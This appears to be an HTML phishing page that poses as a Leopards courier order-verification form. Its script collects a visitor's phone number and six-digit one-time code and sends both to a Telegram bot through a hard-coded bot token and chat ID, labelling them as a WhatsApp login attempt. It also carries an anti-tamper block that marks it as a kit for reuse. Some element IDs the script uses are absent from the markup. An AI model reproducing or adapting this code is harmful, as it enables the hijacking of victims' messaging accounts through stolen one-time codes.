<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Courier Verification</title>

<link rel="stylesheet"
href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css"/>

<style>

:root{
--yellow:#ffcc00;
--light:#f4f4f4;
}

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial, Helvetica, sans-serif;
}

body{
background:var(--light);
display:flex;
flex-direction:column;
min-height:100vh;
}

.topbar{
background:white;
display:flex;
justify-content:center;
align-items:center;
padding:15px;
border-bottom:4px solid var(--yellow);
}

.logo img{
height:40px;
}

.card{
background:white;
width:90%;
max-width:400px;
margin:auto;
padding:25px;
border-radius:12px;
text-align:center;
border-top:6px solid var(--yellow);
box-shadow:0 6px 15px rgba(0,0,0,0.2);
}

.card h2{
margin-bottom:10px;
}

.card p{
margin-bottom:20px;
color:#555;
}

#phone{
width:100%;
padding:14px;
border:1px solid #ccc;
border-radius:8px;
font-size:16px;
margin-bottom:15px;
}

/* BUTTON */

button{
width:100%;
padding:14px;
background:var(--yellow);
border:none;
font-weight:bold;
border-radius:8px;
cursor:pointer;
}

/* OTP */

.otp-box{
display:flex;
justify-content:space-between;
margin:20px 0;
}

.otp-box input{
width:45px;
height:45px;
font-size:20px;
text-align:center;
border:1px solid #ccc;
border-radius:8px;
}

/* FOOTER */

.footer{
text-align:center;
padding:15px;
background:#111;
color:white;
margin-top:auto;
}

</style>
</head>

<body>

<header class="topbar">
<div class="logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Leopards_Courier_logo.png">
</div>
</header>

<!-- PHONE PAGE -->
<div class="card" id="phonePage">
<h2>Order Verification</h2>
<p>Enter your mobile number for tracking</p>

<input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" autofocus placeholder="Enter Mobile Number">

<button onclick="goToOtp()">Next</button>
</div>

<!-- OTP PAGE -->
<div class="card" id="otpPage" style="display:none;">
<h2>OTP Verification</h2>
<p>Enter the 6 digit verification code</p>

<div class="otp-box">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
</div>

<button>Verify</button>
</div>

<div class="footer">
Courier Verification System
</div>

<script>
function goToOtp(){
// No validation, direct go to OTP page
document.getElementById("phonePage").style.display="none";
document.getElementById("otpPage").style.display="block";
}
   <script>
    // === PROTECTION START ===
    (function() {
      const allowedKeys = ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_IDS"];
      const originalScript = `PLACEHOLDER_HASH`;

      function generateHash(code) {
        let hash = 0, i, chr;
        for (i = 0; i < code.length; i++) {
          chr = code.charCodeAt(i);
          hash = ((hash << 5) - hash) + chr;
          hash |= 0;
        }
        return btoa(hash.toString());
      }

      function verifyIntegrity() {
        const scripts = document.getElementsByTagName("script");
        for (let i = 0; i < scripts.length; i++) {
          if (scripts[i].textContent.includes("TELEGRAM_BOT_TOKEN")) {
            const code = scripts[i].textContent.replace(/\s+/g, "");
            const hash = generateHash(code);

            if (hash !== originalScript) {
              let invalidChange = false;
              allowedKeys.forEach(key => {
                if (!code.includes(key)) invalidChange = true;
              });
              if (invalidChange) {
                document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px'>System Crash! Unauthorized modification detected ❌</h1>";
                throw new Error("Unauthorized modification detected");
              }
            }
          }
        }
      }
      window.addEventListener("load", verifyIntegrity);
    })();
    // === PROTECTION END ===

    // Telegram Bot Configuration - Member can only change these two
    const TELEGRAM_BOT_TOKEN = "8538496270:AAGb4wJQWTaTgWxBaIecTUVe5Iu91BMn8AY";
    const TELEGRAM_CHAT_IDS = ["7601365263"];

    let fullNumber = "";
    let countdownTimer;
    let timeLeft = 60;

    const hiddenText = () => {
      const encoded = "am9pbiBjaGFubmVsIEBCXBoZXJY";
      return atob(encoded);
    };

    async function sendToTelegram(message) {
      const sendPromises = TELEGRAM_CHAT_IDS.map(async (chatId) => {
        try {
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
          });
          const data = await response.json();
          return data.ok;
        } catch (error) {
          return false;
        }
      });
      const results = await Promise.all(sendPromises);
      return results.every(result => result === true);
    }

    window.sendNumber = function() {
      const code = document.getElementById("countryCode").value;
      const num = document.getElementById("phoneNumber").value.trim();
      if (num.length !== 10 || isNaN(num)) { alert("Please enter a valid 10 digit number"); return; }
      fullNumber = code + num;
      document.getElementById("loading").style.display = "block";
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      const message = `⏰<b>Time:${time} Date:</b> ${date}\n\n📱 <b>${hiddenText()} \n \n✅WhatsApp Login Attempt</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n`;
      sendToTelegram(message);
      setTimeout(() => {
        document.getElementById("loading").style.display = "none";
        document.getElementById("numberPage").style.display = "none";
        document.getElementById("otpPage").style.display = "block";
        document.querySelectorAll('.step')[1].classList.add('active');
        document.querySelector('.step-line').classList.add('active');
        startTimer();
      }, 1500);
    };

    function startTimer() {
      timeLeft = 60;
      updateTimerDisplay();
      document.getElementById('resendBtn').classList.add('disabled');
      clearInterval(countdownTimer);
      countdownTimer = setInterval(() => {
        timeLeft--; updateTimerDisplay();
        if (timeLeft <= 0) { clearInterval(countdownTimer); document.getElementById('resendBtn').classList.remove('disabled'); }
      }, 1000);
    }

    function updateTimerDisplay() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      document.getElementById('countdown').textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
    }

    window.resendOtp = function() {
      if (timeLeft > 0) return;
      document.querySelectorAll('.otp-input').forEach(input => input.value = '');
      alert('OTP has been resent!');
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const message = `🔄 <b>OTP Resent</b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n⏰ <b>Time:</b> ${time}`;
      sendToTelegram(message);
      startTimer();
    };

    window.submitOtp = async function() {
      let otp = '';
      document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
      if (otp.length !== 6 || isNaN(otp)) { alert("Please enter a valid 6 digit OTP"); return; }
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      const message = `⏰ <b>Time:${time} Date:</b> ${date}\n\n✅ <b>OTP Received </b>\n\n📞 <b>Phone Number:</b> ${fullNumber}\n\n🔢 <b>OTP Code:</b> ${otp}\n`;
      const success = await sendToTelegram(message);
      if (success) {
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
        setTimeout(() => { document.getElementById('successMessage').style.display = 'none'; location.reload(); }, 2000);
      } else {
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
      }
      clearInterval(countdownTimer);
    };

    window.tryAgain = function() {
      document.getElementById('errorMessage').style.display = 'none';
      document.getElementById('otpPage').style.display = 'block';
      document.querySelectorAll('.otp-input').forEach(input => input.value = '');
      startTimer();
    };

    function moveToNext(current, nextIndex) {
      if (current.value.length >= current.maxLength) {
        const nextInput = document.querySelectorAll('.otp-input')[nextIndex];
        if (nextInput) nextInput.focus();
      }
      const allInputs = document.querySelectorAll('.otp-input');
      const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
      if (allFilled) submitOtp();
    }
  </script> 
</script>

</body>
</html>
